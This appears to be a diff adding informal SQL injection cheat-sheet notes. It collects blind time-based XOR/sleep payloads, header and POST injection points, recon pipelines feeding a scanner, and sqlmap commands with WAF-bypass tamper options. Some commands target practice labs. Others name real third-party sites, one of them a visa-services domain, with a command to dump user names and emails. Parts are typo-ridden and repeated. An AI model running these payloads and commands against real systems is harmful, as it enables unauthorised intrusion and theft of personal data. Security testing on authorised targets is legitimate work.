@@ -1,0 +1,218 @@
+SQL
+====
+
+XOR(SELECT(0)FROM(SELECT(SLEEP(5)))a)XOR'Z
+
+1 or 1=1' --
+
+$ git clone https://github.com/SAPT01/HBSQLI.git
+$ cd HBSQLI
+$ pip3 install -r requirements.txt 
+
+
+
+BEST SQLI METHODLOGY BY COFFIN:
+for single url:
+python3 lostsec.py -u "http://testphp.vulnweb.com/artists.php?artist=" -p payloads/xor.txt -t 5
+for multiple urls:
+paramspider -d testphp.vulnweb.com -o urls.txt
+cat output/urls.txt | sed 's/FUZZ//g' >final.txt
+python3 lostsec.py -l final.txt -p payloads/xor.txt -t 5
+echo testphp.vulnweb.com | gau --mc 200 | urldedupe >urls.txt
+cat urls.txt | grep -E ".php|.asp|.aspx|.cfm|.jsp" | grep '=' | sort > output.txt
+cat output.txt | sed 's/=.*/=/' >final.txt
+python3 lostsec.py -l final.txt -p payloads/xor.txt -t 5
+echo testphp.vulnweb.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | urldedupe >output.txt
+katana -u http://testphp.vulnweb.com -d 5 | grep '=' | urldedupe | anew output.txt
+cat output.txt | sed 's/=.*/=/' >final.txt
+python3 lostsec.py -l final.txt -p payloads/xor.txt -t 5
+
+
+sql injection
+
+we can unject sql
+
+get and post
+
+
+godfather
+
+get request  
+
+https://https://csd.contentsquare.com/inject here
+
+https://https://csd.contentsquare.com?id=1 inject here
+
+https://https://csd.contentsquare.com?id inject here=1
+
+https://https://csd.contentsquare.com/inject here
+
+https://https://csd.contentsquare.com/app_dev.php/1*inject here
+
+file upload  filename big.jpg inject here
+
+
+POST /login_check HTTP/1.1
+Host: csd.contentsquare.com
+X-Host: inject here
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0 inject here
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 102
+Origin: https://csd.contentsquare.com
+Connection: close
+Referer: https://csd.contentsquare.com/login inject here
+Cookie: OptanonConsent=isGpcEnabledSec-Fetch-Dest: document inject here
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+
+
+Post request
+
+_csrf_token=uBsbno53QLUbYpYAheJ5pAP7aEZcIKrxfyaKONiNgDo&_username=§admin§&_password=admin&_submit=Log+in
+
+_csrf_token=uBsbno53QLUbYpYAheJ5pAP7aEZcIKrxfyaKONiNgDo&_username=§admin§*inject here&_password=admin *inject here&_submit=Log+in *inject here
+
+
+blind 
+
+Tips : 
+
+Tip: sqli without parameter (https://test.com/index0'XOR(SELECT(0)FROM(SELECT(SLEEP(5)))a)XOR'Z/test/)
+
+
+X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z
+{"mobile_number":"8888888888'XOR(if(now()=sysdate(),SLEEP(5),0))XOR'Z"}
+
+
+Time Based SQLi Payload used: 'xor(if(now()=sysdate(),sleep(10),0))or'
+
+Boolean Based Blind SQLi payload used: 1 AND 1726=1726
+
+Tip:-
+Deep recon subdomain enumeration 
+Site was using in #PHP >>fuzz 
+Found /config.php>> used Arjun tool
+U= parameters and boom #SQLI
+
+0'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z
+
+1. Find subdomains with amass/subfinder
+2. Fuzz to find new/unknown endpoints
+3. Pick one endpoint to inspect further and fuzz POST requests
+4. Boom! time-based blind SQLi
+
+Blind SQLi on a VDP
+Tip:
+1. Gather all urls from waybackurls and Google Dorking.
+2. Inject SQLi payload in all parameters one by one.
+3. Analyze the response.
+Payload used: 0'XOR(if(now()=sysdate(),sleep(10),0)) XOR'Z
+
+I found 2 Blind time-based SQL Injections in X-Forwarded-For: header just using Burp Intruder. Made a list of 500+ HTTP request and tested one by one for 3+ hours, here is the result..
+
+X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z
+how did u dumped a POC of SQLi if Ghauri and Sqlmap failed? and can you write us on the comments a steps how you inject payloads did u check all 500+ requests manualy or you used a some automation tool?
+P.S you are the best in SQLi, keep going bro
+
+
+Another blind SQL injection using the same old payload "0"XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR"Z", this time on a support forum of a hosting company's reset password page. 
+
+The response from the server was x2 per injected time.
+
+
+
+1. found blind sql injection
+2. use simple payload ./sqlmap -r req -p vuln --dbs
+3. the backend db is Firebird
+4. cant retrieve dbname or table
+5. change payload to -r req -p vuln--level 3 --risk 3 --thread 8 --dbms Firebird --tables
+6. puf! *image below
+
+
+
+POST /admin/login ==> 405 
+POST /api/v01/admin/login ==> 200 OK + Blind SQLi 
+
+Tip:
+1. Gather all urls from waybackurls and Google Dorking.
+2. Inject SQLi payload in all parameters one by one.
+3. Analyze the response.
+
+
+
+
+sqlmap ;
+sqlmap -u 'https://birdviewpsa.com/company/gdpr/?p=' --dbs --random-agent ignore=500 - -code=200 -T tablename --columns -- no-cast
+
+"./sqlmap.py -u "https://birdviewpsa.com/company/gdpr/?p=" -p id --level 3 --risk 3 --thread 8 --dbms Firebird --tables" 
+
+
+python3 sqlmap.py -u 'http://localhost:3000/rest/user/login' --data="email=test@test.com&password=test" --level 5 --risk 3 -f --banner --ignore-code 401 --dbms='sqlite' --technique=B
+
+
+1. found blind sql injection
+2. use simple payload ./sqlmap -r req -p vuln --dbs
+3. the backend db is Firebird
+4. cant retrieve dbname or table
+5. change payload to -r req -p vuln--level 3 --risk 3 --thread 8 --dbms Firebird --tables
+6. puf! *image below
+
+
+
+python3 sqlmap.py -u 'http://localhost:3000/rest/user/login' --data="email=test@test.com&password=test" --level 5 --risk 3 -f --banner --ignore-code 401 --dbms='sqlite' --technique=B
+
+    -u is the option that lets us dictate what endpoint we want sqlmap to target
+    --data is the option used to specify our POST data format separated by the & separator
+    --level 5 and --risk 3 are options the determine the types of payloads and techniques that sqlmap uses against the target. The higher the level, the more requests and the more detailed testing you will get. That has pros and cons, and you can check out my cheat sheets for more information on that
+    -f and --banner are fingerprinting options used to enumerate our target and try to gather useful data
+    --ignore-code 401 is used because when sqlmap sends requests with sqli payloads to the target, it will inevitably use invalid credentials which will result in an HTTP 401 response (401 being Unauthorized) from the target application...the problem is that sqlmap will stop sending requests at the first sign of 401 responses unless we provide this flag. We already know the requests will result in 401s, so we don't care and we want to ignore those
+    --dbms='sqlite' if you already know without a doubt that your target application is using a certain database management system, like how we know here that the juice shop uses sqlite, (you can usually figure this out with a little bit of upfront research) we can specify it which will help sqlmap cut back on the number of requests it has to send out and it will speed up our testing. If you don't know what the back-end DBMS is, then you can leave this off and sqlmap will figure it out
+    --technique=B is to tell sqlmap to only use boolean-based blind payloads for testing instead of including all of its other techniques. The only reason I'm doing this is to speed things up since I already know that this application is susceptible to this technique. Otherwise, you can just let sqlmap use all of its available techniques to increase your odds of finding something
+
+
+1,   https://medium.com/@christophelimpalair/bypass-admin-login-with-sql-injections-sqlmap-bb60d447a1e2
+
+
+' OR NOT 1120=1120-- tGvo
+
+Is actually being compared with the results from this slightly modified payload:
+
+' OR NOT 1120=-1120-- tGvo
+
+SELECT * FROM Users WHERE email = 'test@test.com' OR NOT 1120=-1120-- tGvo' AND password = '098f6bcd4621d373cade4e832627b4f6' AND deletedAt IS NULL
+
+SELECT * FROM Users WHERE email = 'test@test.com\' OR NOT 1120=-1120-- tGvo' AND password = '098f6bcd4621d373cade4e832627b4f6' AND deletedAt IS NULL
+
+The test@test.com\' OR NOT 1120=-1120-- tGvo would get treated as a simple string since the ' wouldn’t close the first single quote.
+
+
+
+2,  https://medium.com/@codingbolt.in/sql-injection-vulnerability-allowing-login-bypass-7f1de7d77a6a
+
+
+'or 1=1 limit 1-- -
+
+{"success"}
+
+
+sqlmap -u "xyz.com" --dbs --random-agent --keep-alive --thrads=5 --no-cast --tamper=modsecurityversioned,space2comment --fflush-session 
+--fresh -queries
+
+
+sqlmap -u "https://a27a12ringutrecht.mett.nl/login.pl?course_id=" --dbs --random-agent --keep-alive --threads=5 --no-cast --tamper=modsecurityversioned,space2comment --flush-session --fresh-queries --batch
+
+
+
+# sqlmap -u "view-source:http://sspc.co.uk/search.asp?q=" --dbs --random-agent --keep-alive --threads=5 --no-cast --tamper=modsecurityversioned,space2comment --flush-session --fresh-queries
+
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --tables -D acuart--random-agent --keep-alive --threads=5 --no-cast tamper=modsecurityversioned,space2comment --flush-session --fresh-queries
+
+
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --columns -T users -D acuart --random-agent --keep-alive --threads=5 --no-cast --tamper=modsecurityversioned,space2comment --flush-session --fresh-queries
+
+sqlmap -u "https://suriname.vfsevisa.com/td/undefined/home/index?id=" --dump -C name,email,uname -T users -D acuart --random-agent --keep-alive --threads=5 --no-cast --tamper=modsecurityversioned,space2comment --flush-session --fresh-queries
